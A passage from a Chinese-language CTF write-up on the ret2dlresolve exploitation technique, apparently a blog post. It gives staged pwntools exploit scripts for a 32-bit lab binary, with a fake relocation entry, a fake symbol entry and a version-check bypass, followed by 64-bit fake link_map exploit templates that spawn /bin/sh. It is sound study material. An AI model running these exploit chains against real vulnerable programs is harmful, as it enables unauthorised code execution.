base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./partial_relro_32')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw(b'a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw(b'a' * (100 - len(rop.chain())))
r.sendline(rop.chain())

r.interactive()
```

* * *

###### Stage2

**直接调用PLT0**

因为程序正常的延迟绑定会执行push reloc_offset；jmp plt0，在此阶段，我们可以手动在栈上布置PLT0的地址，紧跟合法的write重定位偏移量，跳过第一个jmp验证检测，直接跳到PLT0，然后触发\_dl_runtime_resolve解析write

```python
from pwn import *
elf = ELF('./partial_relro_32')
r = process('./partial_relro_32')
rop = ROP('./partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil(b'Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
jmprel_data = elf.get_section_by_name('.rel.plt').data()
writegot = elf.got["write"]
write_reloc_offset = jmprel_data.find(p32(writegot,endian="little"))
print(write_reloc_offset)
rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw(b'bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

* * *

###### Stage3

**伪造重定位表项（Fake ELF32_Rel）**

目的：测试动态链接器能否解析位于非标准区域的重定位表项

操作：在迁移后的bss段构造一个伪造的Elf32_Rel结构体，将其相对真实.rel.plt的偏移量（index_offset）作为参数传递给PLT0，此时，伪造的Elf32_Rel中的r_info字段仍然指向真实的write符号表项

```python
from pwn import *
elf = ELF('./partial_relro_32')
r = process('./partial_relro_32')
rop = ROP('./partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil(b'Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
got0 = elf.get_section_by_name('.got').header.sh_addr

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# make base_stage+24 ---> fake reloc
write_reloc_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x607

rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
# construct fake write relocation entry
rop.raw(write_got)
rop.raw(r_info)
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

* * *

###### Stage4

**伪造符号表项与触发版本控制崩溃**

目的：进一步伪造符号表项Elf32_Sym

崩溃原理：\_dl_runtime_resolve在解析时，会利用r_info的高24位即符号索引去.gnu.version数组中校验，由于我们伪造的Elf32_Sym位于bss段，距离真实的.dynsym非常远，导致算出的索引非常大，此时动态链接器发生数组越界访问，读取到了未知的垃圾数据作为版本哈希指针，导致段错误

需要修复这个问题，通过查阅 glibc 源码可知，如果越界读取到的版本哈希值为 0，动态链接器会直接跳过版本校验。因此，我们需要在内存中寻找一块值为 0 的区域（如 0x080487C2），并通过精确的数学计算，调整我们构造 base_stage 的起始地址，使得最终算出的越界偏移恰好落在这个 0 值上，从而安全绕过安检。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8cf2a17952b51a83.png)

```python
from pwn import *
elf = ELF('./partial_relro_32')
r = process('./partial_relro_32')
rop = ROP('./partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil(b'Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)//2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

rop = ROP('./partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) // 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw(b'a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw(b'a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw(b'a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

* * *

###### Stage5

进一步伪造write符号的st_name指向我们自己构造的字符串

```python
from pwn import *
elf = ELF('./partial_relro_32')
r = process('./partial_relro_32')
rop = ROP('./partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil(b'Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)//2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) // 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('write\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

* * *

###### 最终脚本

```python
from pwn import *

elf = ELF('./partial_relro_32')
r = process('./partial_relro_32')
rop = ROP('./partial_relro_32')

offset = 112               # 溢出到返回地址(ret addr)需要的垃圾数据填充量
bss_addr = elf.bss()       # 获取 .bss 段的起始地址，作为我们伪造数据的“宽敞新家”

r.recvuntil(b'Welcome to XDCTF2015~!\n')

# 阶段一：栈迁移 (Stack Pivoting)
stack_size = 0x800 # 预留的新栈空间大小

# 【核心】：基址偏移计算 (绕过 .gnu.version 版本检查)
# 原理：伪造的符号表项离真实的 .dynsym 太远，导致版本检查时数组越界崩溃。
# 修复：内存地址 0x080487C2 处的值刚好为 0。我们通过精确增加 base_stage 的偏移，
# 使得动态链接器在越界查询时，刚好查到这个 0，从而安全跳过版本检查。
base_stage = bss_addr + stack_size + (0x080487C2 - 0x080487A8) // 2 * 0x10

rop.raw(b'a' * offset)                # 1. 填充满原有栈的缓冲区
rop.read(0, base_stage, 100)          # 2. 调用 read(0, base_stage, 100)，把后续的终极 payload 读入 bss 段
rop.migrate(base_stage)               # 3. 栈迁移指令 (leave; ret)，强行把 CPU 的栈顶指针 esp 挪到 base_stage
r.sendline(rop.chain())               # 发送第一段 payload，此时程序的舞台已经转移到了 bss 段


# 阶段二：计算各个动态链接表的真实基址
rop = ROP('./partial_relro_32')       # 重新初始化 ROP，准备构造第二段 payload
sh = b"/bin/sh"                       # 最终要执行的命令字符串

# 获取四个核心表的内存地址
plt0 = elf.get_section_by_name('.plt').header.sh_addr       # PLT 桩的总入口 (呼叫大老板的专线)
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr # 重定位表 (.rel.plt) 的基址
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr   # 符号表 (.dynsym) 的基址
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr   # 字符串表 (.dynstr) 的基址

# 阶段三：构造伪造的结构体数据

# 构造伪造的符号表项 (Fake Elf32_Sym) 
fake_sym_addr = base_stage + 32 # 安排在 base_stage 偏移 32 字节的地方
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # 内存对齐计算：Elf32_Sym 结构体必须是 16 (0x10) 字节对齐的
fake_sym_addr = fake_sym_addr + align           # 加上对齐所需的偏移，得到最终对齐后的精准地址

# 计算该假符号表项在真实 .dynsym 表中的相对索引下标
index_dynsym = (fake_sym_addr - dynsym) // 0x10  

# 计算我们伪造的字符串 "system\x00" 距离真实字符串表 .dynstr 的偏移量 (st_name)
# 加 0x10 是因为 Elf32_Sym 本身占 16 字节，我们将字符串紧跟在结构体后面存放
st_name = fake_sym_addr + 0x10 - dynstr         

# 打包成 Elf32_Sym 结构体 (st_name, st_value, st_size, st_info)
# 0x12 表示这是一个 Global Function
fake_write_sym = flat([st_name, 0, 0, 0x12])    

# 构造伪造的重定位表项 (Fake Elf32_Rel) 
index_offset = base_stage + 24 - rel_plt        # 计算传给 plt0 的参数 reloc_arg (即该假表项相对于真实 .rel.plt 的偏移)
write_got = elf.got['write']                     # 解析出 system 地址后，把真实地址写回这个原有的 GOT 表位置
r_info = (index_dynsym << 8) | 0x7              # 组装 r_info：高 24 位为符号索引，低 8 位为重定位类型 (0x7)

# 打包成 Elf32_Rel 结构体 (r_offset, r_info)
fake_write_reloc = flat([write_got, r_info])

# 阶段四：极其精密的内存布局 (组装最终 Payload)

# ROP 调用链
rop.raw(plt0)                     # 1. 触发 plt0，唤醒 _dl_runtime_resolve
rop.raw(index_offset)             # 2. 传入伪造的重定位表偏移 reloc_arg
rop.raw(b'bbbb')                  # 3. system 执行完的返回地址 (拿 shell 了，不关心返回到哪)
rop.raw(base_stage + 80)          # 4. system 函数的参数指针，精准指向下面的 "/bin/sh" 所在地址
rop.raw(b'bbbb')                  # 占位符 (此时在 base_stage + 16)
rop.raw(b'bbbb')                  # 占位符 (此时在 base_stage + 20)

# 伪造的结构体与字符串数据 
# 此时位于 base_stage + 24
rop.raw(fake_write_reloc)         # 写入 Fake Elf32_Rel (占 8 字节)
rop.raw(b'a' * align)             # 写入对齐用的填充字节
# 此时位于 fake_sym_addr
rop.raw(fake_write_sym)           # 写入 Fake Elf32_Sym (占 16 字节)
# 此时位于 fake_sym_addr + 16 (即 st_name 指向的位置)
rop.raw(b'system\x00')            # 写入目标函数名！大老板就是被这个名字骗去系统库找 system 的

# 填充垃圾数据，确保下一个数据的起始位置严格位于 base_stage + 80
rop.raw(b'a' * (80 - len(rop.chain()))) 

# 此时位于 base_stage + 80
rop.raw(sh + b'\x00')             # 写入 system 的参数 "/bin/sh\x00"

# 将整个 payload 补齐至 100 字节，防止 read 提前截断或引发其他异常
rop.raw(b'a' * (100 - len(rop.chain())))

# 发送与交互
print(rop.dump())                 # 打印 payload 内存布局图，方便调试
print("Payload length:", len(rop.chain()))
r.sendline(rop.chain())           # 发送致命一击
r.interactive()                  
```

###### 自动化工具

###### 脚本

```python
from pwn import *

# 开启 debug 可以看到发包的详细过程
context(arch='i386', os='linux', log_level='debug')
elf = ELF('./partial_relro_32')
p = process('./partial_relro_32')

# 找一个安全的 BSS 地址存放伪造的假表
# 放在 0x300 偏移处，既安全又不会超出段保护
bss_addr = elf.bss() + 0x300

# 魔法开启：让 Pwntools 帮我们干脏活累活
# 这一行代码，自动算好了 6 个 Stage 的所有偏移，并造好了假结构体！
dl = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"], data_addr=bss_addr)

rop = ROP(elf)

# 第一步：正常调用 read，把假表数据(dl.payload)读进 bss_addr
# pwntools 会自动帮我们加上 pop3_ret，保证执行完能平滑进入下一步
rop.read(0, dl.data_addr, len(dl.payload))

# 第二步：无缝衔接，直接调用解析函数，一击致命
rop.ret2dlresolve(dl)

# 组合发送 Payload
padding = b"A" * 112
payload1 = padding + rop.chain()

# read 读了 0x100 (256) 字节
# 我们必须把第一包填满 256 字节，强迫 read 结束，绝对不能让它吞掉第二包的数据！
payload1 = payload1.ljust(256, b'\x00')

p.recvuntil(b'Welcome to XDCTF2015~!\n')

# 发送 ROP 链
p.send(payload1)

# 稍微暂停一下，等待 CPU 流转到我们的 read 函数里
sleep(0.1)

# 发送伪造的结构体数据（也就是给 dl.data_addr 填数据）
p.send(dl.payload)

p.interactive()
```

-   **空间要求**：

-   32 位的 payload 大概需要 100 多个字节。
-   64 位的 payload（带有巨大的 link_map）通常需要 300 到 500 个字节。

#### 64位

> 对于上述的方法，通过超大的偏移量，去直接读到我们自己构造的结构体中，在32位程序中十分好用，但是对于64位程序，大概率会在解析时直接崩溃

```python
if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) {
    // 致命的读取：
    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
}
```

可以看到，这里有一段校验代码，因为我们为了让地址越界到.bss，伪造了一个巨大的sym_index（也就是代码中的ELFW(R_SYM)(reloc->r_info)）而系统去vernum数组里取版本号的时候，没有做边界检查，它会拿着巨大的索引去读取内存，直接读到了没有映射的非法内存地址，引发Segfault

##### 解法

Fake link_map技术

为了绕过这个DT_VERSYM崩溃，我们得使用另一种操作：伪造整个link_map

前面所有\_dl_fixup的所有基址（比如SYMTAB，STRTAB，以及DT_VERSYM），全是从struct link_map \*l这个大结构体中读出来的

##### 攻击思路

1.在.bss段，伪造一个庞大的link_map结构体

2.在里面把1_info\[DT_SYMTAB\]等指针改掉，真实的 link_map 里的这些指针，指向的是系统默认的、只读的符号表和字符串表。我们在假地图里，把这些指针全改了，让它们指向我们同样伪造在.bss 段的 Elf64_Sym（写着 "system" 偏移的假符号）和 Elf64_Rela（重定位表）。

3.把1_info\[DT_VERSYM\]改为NULL（0），这样就不会执行导致崩溃的版本验证代码

4.在ROP链中，我们不去跳转PLT0，而是利用某些Gadget手动触发 \_dl_runtime_resolve，或者改写GOT\[1\]，把我们伪造的link_map的地址传给他，因为如果执行了PLT0的话，就会正常跳转到GOT1，将系统真实的link_map压进去，这样伪造的link_map就没用了。然后直接GOT2跳到 \_ dl_runtime_resolve函数触发

5.双重索引与基址对消魔术（底层计算绕过） ，这是伪造结构体时最巧妙的思想，涉及两个关键索引：

-   **第一把钥匙（传参 reloc_arg）**：我们在 ROP 链中直接给参数 `reloc_arg = 0` 。系统计算： `假重定位表基址 + 0 * 24 = 假重定位表` 。
-   **第二把钥匙（结构体内的 r_info）**：在假重定位表里，我们将 `r_info` 设为 `0x100000007` （即告诉系统查第 1 号符号）。
-   **基址对消（神来之笔）**：为了让系统算出的“第 1 号符号”刚好落在我们的假符号上，我们把假地图里的 `DT_SYMTAB` （符号表基址）故意设为： `假符号真实地址 - 24` 。 系统最终计算： `(假符号真实地址 - 24) + 1 * 24 = 假符号真实地址` 。完美命中！

这里可以直接使用pwntools，省去自己构造这么多结构体的麻烦，使用pwntools中封装好的自动化工具：Ret2dlresolvePayload

示例：

```python
from pwn import *

elf = ELF("./main_partial_relro_64")
# ... 省略基础设置 ...

# 设定我们在 .bss 段上用来存放伪造数据的基址
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"], data_addr=0x600c00)

# 生成 ROP 链：先调用 read，把 pwntools 准备好的 dlresolve.payload 写入到 .bss 中
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))

# 然后，跳转并解析！
rop.ret2dlresolve(dlresolve)

# 最后全部打出去
p.sendline(rop.chain())
p.send(dlresolve.payload) # 把那个精美伪造的结构体包裹发送过去
```

对于data_addr的选择，应该满足如下：

1.必须是可写，并且已知的地址

2.必须可读可写，常用bss段

3.需要有足够的空间，32 位的 payload 大概需要 100 多个字节，64 位的 payload（带有巨大的 link_map）通常需要 300 到 500 个字节。

4.内存对齐，在 64 位下，内存对齐十分重要：

-   **原因**：动态链接器在解析 64 位的 Elf64_Sym（符号表）、Elf64_Rela（重定位表）以及我们伪造的 link_map 时，底层 C 语言代码使用的是结构体指针强转。64 位架构下，系统极度依赖 8 字节对齐。如果你的结构体落在了一个不对齐的地址（比如末尾是 0x...1 或 0x...3），解析器一读取里面的数据，系统就会抛出总线错误（Bus Error）或段错误崩溃。
-   **最佳实践**：给定的 data_addr 必须是 **8 的倍数（最好是 16 的倍数）**。

-   例如：0x601000, 0x601080 是好地址。
-   例如：0x601005 就是一个错误地址。
-   （注：pwntools 内部会自动帮你做结构体内的对齐 padding，但前提是你给的起始地址 data_addr 必须是对齐的。）

选择一个好的data_addr的方法：

1.使用readelf -S./pwn 或在 GDB 中看 vmmap，找到.bss 段的起始地址和结束地址。

2.公式： **data_addr =.bss 起始地址 + 0x300** （或者 0x400, 0x500 等，确保它还在 BSS 范围内）。

3.确保计算出的地址最后一位最好是0，完美满足64位对齐要求

##### 具体分析

题目为CTF-Wiki 中的main_partial_relro_64

###### 64位的变化

glibc 中默认编译使用的是 `ELF_Rela` 来记录重定位项的内容

```python
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
/* How to extract and insert information held in the r_info field.  */
#define ELF64_R_SYM(i)                        ((i) >> 32)
#define ELF64_R_TYPE(i)                        ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) << 32) + (type))
```

**Elf64_Sym 大小是 24 字节**

根据IDA里的重定位表的信息可以知道，write函数在符号表中的偏移为1

```latex
LOAD:0000000000400488 ; ELF JMPREL Relocation Table
LOAD:0000000000400488                 Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT write
LOAD:00000000004004A0                 Elf64_Rela <601020h, 200000007h, 0> ; R_X86_64_JUMP_SLOT strlen
LOAD:00000000004004B8                 Elf64_Rela <601028h, 300000007h, 0> ; R_X86_64_JUMP_SLOT setbuf
LOAD:00000000004004D0                 Elf64_Rela <601030h, 400000007h, 0> ; R_X86_64_JUMP_SLOT read
LOAD:00000000004004D0 LOAD            ends
```

确实在符号表中的偏移为 1。

```latex
LOAD:00000000004002C0 ; ELF Symbol Table
LOAD:00000000004002C0      Elf64_Sym <0>
LOAD:00000000004002D8      Elf64_Sym <offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0> ; "write"
LOAD:00000000004002F0      Elf64_Sym <offset aStrlen - offset byte_400398, 12h, 0, 0, 0, 0> ; "strlen"
LOAD:0000000000400308      Elf64_Sym <offset aSetbuf - offset byte_400398, 12h, 0, 0, 0, 0> ; "setbuf"
LOAD:0000000000400320      Elf64_Sym <offset aRead - offset byte_400398, 12h, 0, 0, 0, 0> ; "read"
...
```

在64位下，Elf64_Sym结构体为

```python
typedef struct {
    Elf64_Word    st_name;   // 4 字节 (32位) —— 符号名在字符串表中的偏移量
    unsigned char st_info;   // 1 字节 (8位)  —— 符号的类型和绑定属性
    unsigned char st_other;  // 1 字节 (8位)  —— 符号的可见性 (通常填0)
    Elf64_Half    st_shndx;  // 2 字节 (16位) —— 所在的段索引 (也就是你说的 Elf64_Section)
    Elf64_Addr    st_value;  // 8 字节 (64位) —— 符号的真实内存地址
    Elf64_Xword   st_size;   // 8 字节 (64位) —— 符号的大小 (比如函数占多少字节)
} Elf64_Sym;
```

其中 Elf64_word 32位

```plain
     Elf64_Section 16位

     Elf64_Addr 64位

     Elf64_Xword 64位
```

所以，Elf_Sym的大小为24个字节

除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0。

```latex
.plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:0000000000400510 _write          proc near               ; CODE XREF: main+B3↓p
.plt:0000000000400510                 jmp     cs:off_601018
.plt:0000000000400510 _write          endp
.plt:0000000000400510
.plt:0000000000400516 ; ---------------------------------------------------------------------------
.plt:0000000000400516                 push    0
.plt:000000000040051B                 jmp     sub_400500
```

## 总结

|     |     |     |     |
| --- | --- | --- | --- |   
|     | 修改 dynamic 节的内容 | 修改重定位表项的位置 | 伪造 linkmap |
| 主要前提要求 | 无   | 无   | 无信息泄漏时需要 libc |
| 适用情况 | NO RELRO | NO RELRO, Partial RELRO | NO RELRO, Partial RELRO |
| 注意点 |     | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |

总的来说，与ret2dlresolve攻击最为相关的一些动态节为

DT_JMPREL（指向.rel.plt（32位）或.rela.plt（64位）段的起始地址。里面存放的是“重定位表项”（告诉你哪个GOT表需要被修改，以及对应的符号是啥）。）

DT_SYMTAB（指向.dynsym 段的起始地址。这是一个巨大的结构体数组，里面记录了程序用到的所有外部函数（符号）的信息（包含符号的值、大小、类型，以及 **名字所在的偏移量**））

DT_STRTAB（指向.dynstr 段的起始地址。这其实就是一个大号的字符数组，里面密密麻麻塞满了以 结尾的字符串（比如 "printf puts read "））

DT_VERSYM（指向.gnu.version 段。因为 Linux 发展了很多年，libc 里的同一个函数可能有好几个版本（比如 glibc 2.2.5 的版本，glibc 2.34 的版本），这个表用来校验你要解析的函数版本对不对）

### exp模板

> 一位大师傅给出的模板

```python
#coding:utf-8
 
from pwn import *
context.log_level = 'debug'
elf = ELF('./pwn222')
libc = elf.libc
p = process('./pwn222')
gdb.attach(p,'b*0x04011AA') # main ret
# libc = ELF('./libc')


'''
typedef struct            
{
    Elf64_Word    st_name;        /* Symbol name (string tbl index) */
      unsigned char    st_info;    /* Symbol type and binding */        
      unsigned char st_other;        /* Symbol visibility */              
      Elf64_Section    st_shndx;    /* Section index */                  
      Elf64_Addr    st_value;        /* Symbol value */                   
      Elf64_Xword    st_size;        /* Symbol size */                    
}Elf64_Sym;
 
typedef struct           
{
  Elf64_Addr    r_offset;        /* Address */                         
  Elf64_Xword    r_info;            /* Relocation type and symbol index */
  Elf64_Sxword    r_addend;        /* Addend */                          
}Elf64_Rela;
 
typedef struct          
{
  Elf64_Sxword    d_tag;            /* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;        /* Integer value */
      Elf64_Addr d_ptr;            /* Address value */
    } d_un;
}Elf64_Dyn;
'''
 
universal_gadget1 = 0x00040122A # gadget_end
universal_gadget2 = 0x000401210 # gadget_front
 
Elf64_Sym_len = 0x18
Elf64_Rela_len = 0x18
write_addr = 0x404040 + 0x440  # write to where
log.info('bss: '+ hex(elf.bss()))

link_map_addr = write_addr+0x18
rbp = write_addr-8
pop_rdi_ret = 0x000401233
leave = 0x004011aa
main = 0x0401146
 
#fake_Elf64_Dyn_STR_addr = l+0x68  
#fake_Elf64_Dyn_SYM_addr = l+0x70  
#fake_Elf64_Dyn_JMPREL_addr = l+0xf8
 
l_addr = libc.sym['system'] - libc.sym['__libc_start_main']
#l->l_addr + sym->st_value
# value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
 
def fake_link_map_gen(link_map_addr,l_addr,st_value):
    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + 0x18
    fake_Elf64_Dyn_SYM_addr = link_map_addr + 8
    fake_Elf64_Dyn_STR_addr = link_map_addr
    fake_Elf64_Dyn_JMPREL = p64(0) + p64(link_map_addr+0x28)
    fake_Elf64_Dyn_SYM = p64(0) + p64(st_value-8)
    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(7) + p64(0)
 
    fake_link_map = p64(l_addr)            #0x8
    fake_link_map += fake_Elf64_Dyn_SYM    #0x10
    fake_link_map += fake_Elf64_Dyn_JMPREL #0x10
    fake_link_map += fake_Elf64_rela       #0x18
    fake_link_map += b'\x00'*0x28
    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) #link_map_addr + 0x68
    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) #link_map_addr + 0x70
    fake_link_map += b'/bin/sh\x00'.ljust(0x80,b'\x00')
    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)
    return fake_link_map

def get_fake_link_map(fake_link_map_addr,l_addr,st_value):
  # 给出各个指针的假地址
  fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)
  fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + 0x8)
  fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + 0x18)

  # 伪造相关结构体
  fake_Elf64_Dyn_SYM = flat(p64(0),p64(st_value-8))
  fake_Elf64_Dyn_JMPREL = flat(p64(0),p64(fake_link_map_addr+0x28)  )# JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28
  r_offset = fake_link_map_addr - l_addr
  log.info("r_offset :"+str(hex(r_offset)))
  fake_Elf64_rela = flat(p64(r_offset),p64(7),p64(0))

  # fake_link_map整体结构
  fake_link_map = flat(   # 0x0
    p64(l_addr),          # 0x8
    fake_Elf64_Dyn_SYM,   # 0x18
    fake_Elf64_Dyn_JMPREL,# 0x28
    fake_Elf64_rela,      # 0x40
    "\x00"*0x28,         # 0x68，下面开始放指针
    fake_Elf64_Dyn_STR_addr,  # STRTAB指针,0x70
    fake_Elf64_Dyn_SYM_addr,  # SYMTAB指针,0x78
    "/bin/sh\x00".ljust(0x80,"\x00"),
    fake_Elf64_Dyn_JMPREL_addr, # JMPREL指针
  )
  return fake_link_map

fake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got['__libc_start_main'])
 
payload = b'a'*0x20
payload += p64(rbp)
payload += p64(universal_gadget1)
payload += p64(0)  #pop rbx
payload += p64(1)  #pop rbp
payload += p64(0)  #pop r12
payload += p64(write_addr) #pop r13
payload += p64(len(fake_link_map)+0x18)  #pop r14
payload += p64(elf.got['read'])           #pop r15
payload += p64(universal_gadget2)  #ret
payload += p64(0)*7
payload += p64(main)
payload = payload.ljust(0x200,b'\x00')
p.send(payload)

sleep(1)
 
fake_info = p64(0x00401026)        #jmp plt0+6
fake_info += p64(link_map_addr)
fake_info += p64(0)
fake_info += fake_link_map

p.send(fake_info)
sleep(1)
 
payload = b'b'*0x20+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+0x78)+p64(leave)
#stack pivot,进入函数重定向
payload = payload.ljust(0x200,b'\x00')
p.send(payload)
 
p.interactive()
```

参考学习：  
[高级栈溢出之ret2dlresolve详解(x86&x64)](https://bbs.kanxue.com/thread-266769-1.htm)  
[深入理解ret2dlresolve](https://collectcrop.github.io/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/)  
[ret2dlresolve超详细教程(x86&x64)](https://blog.csdn.net/qq_51868336/article/details/114644569)

初来乍到，可能会有一些地方表述不到位，或者本身理解不够深入，欢迎各位师傅批评指正！！
